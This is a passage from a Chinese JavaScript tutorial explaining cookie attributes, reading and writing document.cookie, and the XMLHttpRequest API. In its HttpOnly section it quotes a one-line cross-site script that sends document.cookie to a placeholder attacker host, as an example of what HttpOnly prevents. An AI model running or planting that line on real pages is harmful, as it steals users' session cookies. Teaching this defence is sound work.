<span>Domain，Path</span>\n        </h3>\n    <p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，<code>example.com</code>不设置 Cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 Cookie。如果指定了<code>domain</code>属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p>\n<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>\n\n        <h3>\n            <a href='#Secure，HttpOnly' class='header-anchor'>#</a>\n            <span>Secure，HttpOnly</span>\n        </h3>\n    <p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>\n<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>Document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>\n<pre class=\"prettyprint language-javascript\"><code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code></pre><p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>\n\n        <h2>\n            <a href='#document.cookie' class='header-anchor'>#</a>\n            <span>document.cookie</span>\n        </h2>\n    <p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>\n<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie // &quot;foo=bar;baz=bar&quot;</code></pre><p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var cookies = document.cookie.split(&#039;;&#039;);\n\nfor (var i = 0; i &lt; cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar</code></pre><p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie = &#039;fontSize=14&#039;;</code></pre><p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>\n<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie = &#039;test1=hello&#039;;\ndocument.cookie = &#039;test2=world&#039;;\ndocument.cookie\n// test1=hello;test2=world</code></pre><p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>\n<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;</code></pre><p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>\n<p>各个属性的写入注意点如下。</p>\n<ul>\n<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>\n<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>\n<li><code>max-age</code>属性的值为秒数。</li>\n<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>\n</ul>\n<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie = &#039;fontSize=14; &#039;\n  + &#039;expires=&#039; + someDate.toGMTString() + &#039;; &#039;\n  + &#039;path=/subdirectory; &#039;\n  + &#039;domain=*.example.com&#039;;</code></pre><p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>\n<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.cookie = &#039;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#039;;</code></pre><p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\">HTTP cookies</a>, by MDN</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"XMLHttpRequest 对象","link":"/bom/xmlhttprequest.html"}],"content":"\n        <h1>\n            <a href='#XMLHttpRequest-对象' class='header-anchor'>#</a>\n            <span>XMLHttpRequest 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#简介' class='header-anchor'>#</a>\n            <span>简介</span>\n        </h2>\n    <p>浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。</p>\n<p>1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。</p>\n<p>具体来说，AJAX 包括以下几个步骤。</p>\n<ol>\n<li>创建 XMLHttpRequest 实例</li>\n<li>发出 HTTP 请求</li>\n<li>接收服务器传回的数据</li>\n<li>更新网页数据</li>\n</ol>\n<p>概括起来，就是一句话，AJAX 通过原生的<code>XMLHttpRequest</code>对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。</p>\n<p><code>XMLHttpRequest</code>对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有<code>XML</code>和<code>Http</code>，它实际上可以使用多种协议（比如<code>file</code>或<code>ftp</code>），发送任何格式的数据（包括字符串和二进制）。</p>\n<p><code>XMLHttpRequest</code>本身是一个构造函数，可以使用<code>new</code>命令生成实例。它没有任何参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();</code></pre><p>一旦新建实例，就可以使用<code>open()</code>方法发出 HTTP 请求。</p>\n<pre class=\"prettyprint language-javascript\"><code>xhr.open(&#039;GET&#039;, &#039;http://www.example.com/page.php&#039;, true);</code></pre><p>上面代码向指定的服务器网址，发出 GET 请求。</p>\n<p>然后，指定回调函数，监听通信状态（<code>readyState</code>属性）的变化。</p>\n<pre class=\"prettyprint language-javascript\"><code>ajax.onreadystatechange = handleStateChange;\n\nfunction handleStateChange() {\n  // ...\n}</code></pre><p>上面代码中，一旦<code>XMLHttpRequest</code>实例的状态发生变化，就会调用监听函数<code>handleStateChange</code></p>\n<p>一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。</p>\n<p>注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。</p>\n<p>下面是<code>XMLHttpRequest</code>对象简单用法的完整例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nxhr.onreadystatechange = function(){\n  // 通信成功时，状态值为4\n  if (xhr.readyState === 4){\n    if (xhr.status === 200){\n      console.log(xhr.responseText);\n    } else {\n      console.error(xhr.statusText);\n    }\n  }\n};\n\nxhr.onerror = function (e) {\n  console.error(xhr.statusText);\n};\n\nxhr.open(&#039;GET&#039;, &#039;/endpoint&#039;, true);\nxhr.send(null);</code></pre>\n        <h2>\n            <a href='#XMLHttpRequest-的实例属性' class='header-anchor'>#</a>\n            <span>XMLHttpRequest 的实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#XMLHttpRequest.readyState' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.readyState</span>\n        </h3>\n    <p><code>XMLHttpRequest.readyState</code>返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。</p>\n<ul>\n<li>0，表示 XMLHttpRequest 实例已经生成，但是实例的<code>open()</code>方法还没有被调用。</li>\n<li>1，表示<code>open()</code>方法已经调用，但是实例的<code>send()</code>方法还没有调用，仍然可以使用实例的<code>setRequestHeader()</code>方法，设定 HTTP 请求的头信息。</li>\n<li>2，表示实例的<code>send()</code>方法已经调用，并且服务器返回的头信息和状态码已经收到。</li>\n<li>3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的<code>responseType</code>属性等于<code>text</code>或者空字符串，<code>responseText</code>属性就会包含已经收到的部分信息。</li>\n<li>4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。</li>\n</ul>\n<p>通信过程中，每当实例对象发生状态变化，它的<code>readyState</code>属性的值就会改变。这个值每一次变化，都会触发<code>readyStateChange</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nif (xhr.readyState === 4) {\n  // 请求结束，处理服务器返回的数据\n} else {\n  // 显示提示“加载中……”\n}</code></pre><p>上面代码中，<code>xhr.readyState</code>等于<code>4</code>时，表明脚本发出的 HTTP 请求已经成功。其他情况，都表示 HTTP 请求还在进行中。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.onreadystatechange' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.onreadystatechange</span>\n        </h3>\n    <p><code>XMLHttpRequest.onreadystatechange</code>属性指向一个监听函数。<code>readystatechange</code>事件发生时（实例的<code>readyState</code>属性变化），就会执行这个属性。</p>\n<p>另外，如果使用实例的<code>abort()</code>方法，终止 XMLHttpRequest 请求，也会造成<code>readyState</code>属性变化，导致调用<code>XMLHttpRequest.onreadystatechange</code>属性。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open( &#039;GET&#039;, &#039;http://example.com&#039; , true );\nxhr.onreadystatechange = function () {\n  if (xhr.readyState !== 4 || xhr.status !== 200) {\n    return;\n  }\n  console.log(xhr.responseText);\n};\nxhr.send();</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.response' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.response</span>\n        </h3>\n    <p><code>XMLHttpRequest.response</code>属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由<code>XMLHttpRequest.responseType</code>属性决定。该属性只读。</p>\n<p>如果本次请求没有成功或者数据不完整，该属性等于<code>null</code>。但是，如果<code>responseType</code>属性等于<code>text</code>或空字符串，在请求没有结束之前（<code>readyState</code>等于3的阶段），<code>response</code>属性包含服务器已经返回的部分数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\n\nxhr.onreadystatechange = function () {\n  if (xhr.readyState === 4) {\n    handler(xhr.response);\n  }\n}</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.responseType' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.responseType</span>\n        </h3>\n    <p><code>XMLHttpRequest.responseType</code>属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用<code>open()</code>方法之后、调用<code>send()</code>方法之前，设置这个属性的值，告诉服务器返回指定类型的数据。如果<code>responseType</code>设为空字符串，就等同于默认值<code>text</code>。</p>\n<p><code>XMLHttpRequest.responseType</code>属性可以等于以下值。</p>\n<ul>\n<li>&quot;&quot;（空字符串）：等同于<code>text</code>，表示服务器返回文本数据。</li>\n<li>&quot;arraybuffer&quot;：ArrayBuffer 对象，表示服务器返回二进制数组。</li>\n<li>&quot;blob&quot;：Blob 对象，表示服务器返回二进制对象。</li>\n<li>&quot;document&quot;：Document 对象，表示服务器返回一个文档对象。</li>\n<li>&quot;json&quot;：JSON 对象。</li>\n<li>&quot;text&quot;：字符串。</li>\n</ul>\n<p>上面几种类型之中，<code>text</code>类型适合大多数情况，而且直接处理文本也比较方便。<code>document</code>类型适合返回 HTML / XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。<code>blob</code>类型适合读取二进制数据，比如图片文件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;/path/to/image.png&#039;, true);\nxhr.responseType = &#039;blob&#039;;\n\nxhr.onload = function(e) {\n  if (this.status === 200) {\n    var blob = new Blob([xhr.response], {type: &#039;image/png&#039;});\n    // 或者\n    var blob = xhr.response;\n  }\n};\n\nxhr.send();</code></pre><p>如果将这个属性设为<code>ArrayBuffer</code>，就可以按照数组的方式处理二进制数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;/path/to/image.png&#039;, true);\nxhr.responseType = &#039;arraybuffer&#039;;\n\nxhr.onload = function(e) {\n  var uInt8Array = new Uint8Array(this.response);\n  for (var i = 0, len = binStr.length; i &lt; len; ++i) {\n    // var byte = uInt8Array[i];\n  }\n};\n\nxhr.send();</code></pre><p>如果将这个属性设为<code>json</code>，浏览器就会自动对返回数据调用<code>JSON.parse()</code>方法。也就是说，从<code>xhr.response</code>属性（注意，不是<code>xhr.responseText</code>属性）得到的不是文本，而是一个 JSON 对象。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.responseText' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.responseText</span>\n        </h3>\n    <p><code>XMLHttpRequest.responseText</code>属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;/server&#039;, true);\n\nxhr.responseType = &#039;text&#039;;\nxhr.onload = function () {\n  if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n    console.log(xhr.responseText);\n  }\n};\n\nxhr.send(null);</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.responseXML' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.responseXML</span>\n        </h3>\n    <p><code>XMLHttpRequest.responseXML</code>属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于<code>null</code>。</p>\n<p>该属性生效的前提是 HTTP 回应的<code>Content-Type</code>头信息等于<code>text/xml</code>或<code>application/xml</code>。这要求在发送请求前，<code>XMLHttpRequest.responseType</code>属性要设为<code>document</code>。如果 HTTP 回应的<code>Content-Type</code>头信息不等于<code>text/xml</code>和<code>application/xml</code>，但是想从<code>responseXML</code>拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用<code>XMLHttpRequest.overrideMimeType()</code>方法，强制进行 XML 解析。</p>\n<p>该属性得到的数据，是直接解析后的文档 DOM 树。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;/server&#039;, true);\n\nxhr.responseType = &#039;document&#039;;\nxhr.overrideMimeType(&#039;text/xml&#039;);\n\nxhr.onload = function () {\n  if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n    console.log(xhr.responseXML);\n  }\n};\n\nxhr.send(null);</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.responseURL' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.responseURL</span>\n        </h3>\n    <p><code>XMLHttpRequest.responseURL</code>属性是字符串，表示发送数据的服务器的网址。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;http://example.com/test&#039;, true);\nxhr.onload = function () {\n  // 返回 http://example.com/test\n  console.log(xhr.responseURL);\n};\nxhr.send(null);</code></pre><p>注意，这个属性的值与<code>open()</code>方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.status，XMLHttpRequest.statusText' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.status，XMLHttpRequest.statusText</span>\n        </h3>\n    <p><code>XMLHttpRequest.status</code>属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为<code>0</code>。该属性只读。</p>\n<ul>\n<li>200, OK，访问正常</li>\n<li>301, Moved Permanently，永久移动</li>\n<li>302, Move temporarily，暂时移动</li>\n<li>304, Not Modified，未修改</li>\n<li>307, Temporary Redirect，暂时重定向</li>\n<li>401, Unauthorized，未授权</li>\n<li>403, Forbidden，禁止访问</li>\n<li>404, Not Found，未发现指定网址</li>\n<li>500, Internal Server Error，服务器发生错误</li>\n</ul>\n<p>基本上，只有2xx和304的状态码，表示服务器返回是正常状态。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (xhr.readyState === 4) {\n  if ( (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)\n    || (xhr.status === 304) ) {\n    // 处理服务器的返回数据\n  } else {\n    // 出错\n  }\n}</code></pre><p><code>XMLHttpRequest.statusText</code>属性返回一个字符串，表示服务器发送的状态提示。不同于<code>status</code>属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用<code>open()</code>方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为&quot;“OK”。该属性为只读属性。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout</span>\n        </h3>\n    <p><code>XMLHttpRequest.timeout</code>属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。</p>\n<p><code>XMLHttpRequestEventTarget.ontimeout</code>属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nvar url = &#039;/server&#039;;\n\nxhr.ontimeout = function () {\n  console.error(&#039;The request for &#039; + url + &#039; timed out.&#039;);\n};\n\nxhr.onload = function() {\n  if (xhr.readyState === 4) {\n    if (xhr.status === 200) {\n      // 处理服务器返回的数据\n    } else {\n      console.error(xhr.statusText);\n    }\n  }\n};\n\nxhr.open(&#039;GET&#039;, url, true);\n// 指定 10 秒钟超时\nxhr.timeout = 10 * 1000;\nxhr.send(null);</code></pre>\n        <h3>\n            <a href='#事件监听属性' class='header-anchor'>#</a>\n            <span>事件监听属性</span>\n        </h3>\n    <p>XMLHttpRequest 对象可以对以下事件指定监听函数。</p>\n<ul>\n<li>XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数</li>\n<li>XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数</li>\n<li>XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了<code>abort()</code>方法）的监听函数</li>\n<li>XMLHttpRequest.onerror：error 事件（请求失败）的监听函数</li>\n<li>XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数</li>\n<li>XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数</li>\n<li>XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>xhr.onload = function() {\n var responseText = xhr.responseText;\n console.log(responseText);\n // process the response.\n};\n\nxhr.onabort = function () {\n  console.log(&#039;The request was aborted&#039;);\n};\n\nxhr.onprogress = function (event) {\n  console.log(event.loaded);\n  console.log(event.total);\n};\n\nxhr.onerror = function() {\n  console.log(&#039;There was an error!&#039;);\n};</code></pre><p><code>progress</code>事件的监听函数有一个事件对象参数，该对象有三个属性：<code>loaded</code>属性返回已经传输的数据量，<code>total</code>属性返回总的数据量，<code>lengthComputable</code>属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有<code>progress</code>事件的监听函数有参数，其他函数都没有参数。</p>\n<p>注意，如果发生网络错误（比如服务器无法连通），<code>onerror</code>事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.withCredentials' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.withCredentials</span>\n        </h3>\n    <p><code>XMLHttpRequest.withCredentials</code>属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为<code>false</code>，即向<code>example.com</code>发出跨域请求时，不会发送<code>example.com</code>设置在本机上的 Cookie（如果有的话）。</p>\n<p>如果需要跨域 AJAX 请求发送Cookie，需要<code>withCredentials</code>属性设为<code>true</code>。注意，同源的请求不需要设置这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;, &#039;http://example.com/&#039;, true);\nxhr.withCredentials = true;\nxhr.send(null);</code></pre><p>为了让这个属性生效，服务器必须显式返回<code>Access-Control-Allow-Credentials</code>这个头信息。</p>\n<pre class=\"prettyprint language-javascript\"><code>Access-Control-Allow-Credentials: true</code></pre><p><code>withCredentials</code>属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果<code>withCredentials</code>属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。</p>\n<p>注意，脚本总是遵守同源政策，无法从<code>document.cookie</code>或者 HTTP 回应的头信息之中，读取跨域的 Cookie，<code>withCredentials</code>属性不影响这一点。</p>\n\n        <h3>\n            <a href='#XMLHttpRequest.upload' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.upload</span>\n        </h3>\n    <p>XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过<code>XMLHttpRequest.upload</code>属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。</p>\n<p>假定网页上有一个<code>&lt;progress&gt;</code>元素。</p>\n<pre class=\"prettyprint language-http\"><code>&lt;progress min=&quot;0&quot; max=&quot;100&quot; value=&quot;0&quot;&gt;0% complete&lt;/progress&gt;</code></pre><p>文件上传时，对<code>upload</code>属性指定<code>progress</code>事件的监听函数，即可获得上传的进度。</p>\n<pre class=\"prettyprint language-javascript\"><code>function upload(blobOrFile) {\n  var xhr = new XMLHttpRequest();\n  xhr.open(&#039;POST&#039;, &#039;/server&#039;, true);\n  xhr.onload = function (e) {};\n\n  var progressBar = document.querySelector(&#039;progress&#039;);\n  xhr.upload.onprogress = function (e) {\n    if (e.lengthComputable) {\n      progressBar.value = (e.loaded / e.total) * 100;\n      // 兼容不支持 &lt;progress&gt; 元素的老式浏览器\n      progressBar.textContent = progressBar.value;\n    }\n  };\n\n  xhr.send(blobOrFile);\n}\n\nupload(new Blob([&#039;hello world&#039;], {type: &#039;text/plain&#039;}));</code></pre>\n        <h2>\n            <a href='#XMLHttpRequest-的实例方法' class='header-anchor'>#</a>\n            <span>XMLHttpRequest 的实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#XMLHttpRequest.open()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.open()</span>\n        </h3>\n    <p><code>XMLHttpRequest.open()</code>方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>void open(\n   string method,\n   string url,\n   optional boolean async,\n   optional string user,\n   optional string password\n);</code></pre><ul>\n<li><code>method</code>：表示 HTTP 动词方法，比如<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>等。</li>\n<li><code>url</code>: 表示请求发送目标 URL。</li>\n<li><code>async</code>: 布尔值，表示请求是否为异步，默认为<code>true</code>。如果设为<code>false</code>，则<code>send()</code>方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为<code>false</code>。</li>\n<li><code>user</code>：表示用于认证的用户名，默认为空字符串。该参数可选。</li>\n<li><code>password</code>：表示用于认证的密码，默认为空字符串。该参数可选。</li>\n</ul>\n<p>注意，如果对使用过<code>open()</code>方法的 AJAX 请求，再次使用这个方法，等同于调用<code>abort()</code>，即终止请求。</p>\n<p>下面发送 POST 请求的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;POST&#039;, encodeURI(&#039;someURL&#039;));</code></pre>\n        <h3>\n            <a href='#XMLHttpRequest.send()' class='header-anchor'>#</a>\n            <span>XMLHttpRequest.send()</span>\n        </h3>\n    <p><code>XMLHttpRequest.send()</code>方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只包含头信息，也就是只有一个 URL，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。</p>\n<p>下面是 GET 请求的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nxhr.open(&#039;GET&#039;,\n  &#039;http://www.example.com/?id=&#039; + encodeURIComponent(id),\n  true\n);\nxhr.send(null);\n\n// 等同于\nvar data = &#039;id=&#039; + encodeURIComponent(id);\nxhr.open(&#039;GET&#039;, &#039;http://www.example.com&#039;, true);\nxhr.send(data);</code></pre><p>上面代码中，<code>GET</code>请求的参数，可以作为查询字符串附加在 URL 后面，也可以作为<code>send</code>方法的参数。</p>\n<p>下面是发送 POST 请求的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var xhr = new XMLHttpRequest();\nvar data = &#039;email=&#039;\n  + encodeURIComponent(email)\n  + &#039;&amp;password=&#039;\n  + encodeURIComponent(password);\n\nxhr.open(&#039;POST&#039;, &#039;http://www.example.com&#039;, true);\nxhr.setRequestHeader(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded&#039;);\nxhr.send(data);</code></pre><p>注意，所有 XMLHttpRequest 的监听事件，都必须在<code>send()</code>方法调用之前设定。</p>\n<p><code>send</code>方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>void send();\nvoid send(ArrayBufferView data);\nvoid send(Blob data);\nvoid send(Document data);\nvoid send(String data);\nvoid send(FormData data);</code></pre><p>如果发送 DOM 对象，在发送之前，数据会先被串行化。发送二进制数据，最好使用<code>ArrayBufferView</code>或<code>Blob</code>对象，这使得通过 Ajax 上传文件成为可能。</p>\n<p>下面是发送表单数据的例子。<code>FormData</code>对象可以用于构造表单数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var formData = new FormData();\n\nformData.append(&#039;username&#039;, &#039;张三&#039;);\nformData.append(&#039;email&#039;, &#039;zhangsan@example.com&#039;);\nformData.append(&#039;birthDate&#039;, 1940);\n\nvar xhr = new XMLHttpRequest();\nxhr.open(&quot;POST&quot;, &quot;/register&quot;);\nxhr.send(formData);</code></pre><p>上面代码<code>FormData</code>对象构造了表单数据，然后使用<code>send()</code>方法发送。它的效果与发送下面的表单数据是一样的。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;form id=&#039;registration&#039; name=&#039;registration&#039; action=&#039;/register&#039;&gt;\n  &lt;input type=&#039;text&#039; name=&#039;username&#039; value=&#039;张三&#039;&gt;\n  &lt;input type=&#039;email&#039; name=&#039;email&#039; value=&#039;zhangsan@example.com&#039;&gt;\n  &lt;input type=&#039;number&#039; name=&#039;birthDate&#039; value=&#039;1940&#039;&gt;\n  &lt;input type=&#039;submit&#039; onclick=&#039;return sendForm(this.form);&#039;&gt;\n&lt;/form&gt;</code></pre><p>下面的例子是使用<code>FormData</code>对象加工表单数据，然后再发送。</p>\n<pre class=\"prettyprint 